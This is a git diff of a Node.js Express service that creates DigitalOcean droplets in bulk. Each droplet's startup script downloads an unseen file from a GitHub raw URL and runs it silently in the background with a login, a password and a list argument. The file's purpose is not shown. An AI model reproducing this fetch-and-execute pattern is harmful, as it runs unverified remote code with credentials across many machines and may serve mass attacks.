@@ -14,14 +14,26 @@ const token = '';
 
 const dateNow = () => Math.floor(Date.now() * 0.001)
 
-const getInstanceTemplate = ({login, password}) => {
-  return JSON.stringify({
-    "names": names,
-    "region": "fra1",
-    "size": "s-1vcpu-1gb",
-    "image": "ubuntu-20-04-x64",
-    "user_data": `#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u ${login} -p ${password} -f list >/dev/null 2>&1 &`
-  })
+const getInstanceTemplate = ({login, password, names, name}) => {
+  if(names) {
+    return JSON.stringify({
+      "names": names,
+      "region": "fra1",
+      "size": "s-1vcpu-1gb",
+      "image": "ubuntu-20-04-x64",
+      "user_data": `#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u ${login} -p ${password} -f list >/dev/null 2>&1 &`
+    })
+  }
+
+  if(name) {
+    return JSON.stringify({
+      "name": name,
+      "region": "fra1",
+      "size": "s-1vcpu-1gb",
+      "image": "ubuntu-20-04-x64",
+      "user_data": `#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u ${login} -p ${password} -f list >/dev/null 2>&1 &`
+    })
+  }
 }
 
 const requestDO = async (resource, opts = {}) => {
@@ -97,7 +109,7 @@ app.post('/fill/:prefix', async (req, res) => {
         Authorization: `Bearer ${req.headers['x-token']}`,
       },
       method: "POST",
-      body: getInstanceTemplate(creds)
+      body: getInstanceTemplate({...creds, names})
     })
 
     x.push(c)
@@ -144,7 +156,7 @@ app.post('/create/:name', async (req, res) => {
       "Content-Type": "application/json",
     },
     method: "POST",
-    body: getInstanceTemplate(creds)
+    body: getInstanceTemplate({...creds, name})
   })
 
   res.send(c)
@@ -170,7 +182,7 @@ app.post('/createAll', async (req, res) => {
         Authorization: `Bearer ${req.headers['x-token']}`,
       },
       method: "POST",
-      body: getInstanceTemplate(creds)
+      body: getInstanceTemplate({...creds, names})
     })
 
     x.push(c)
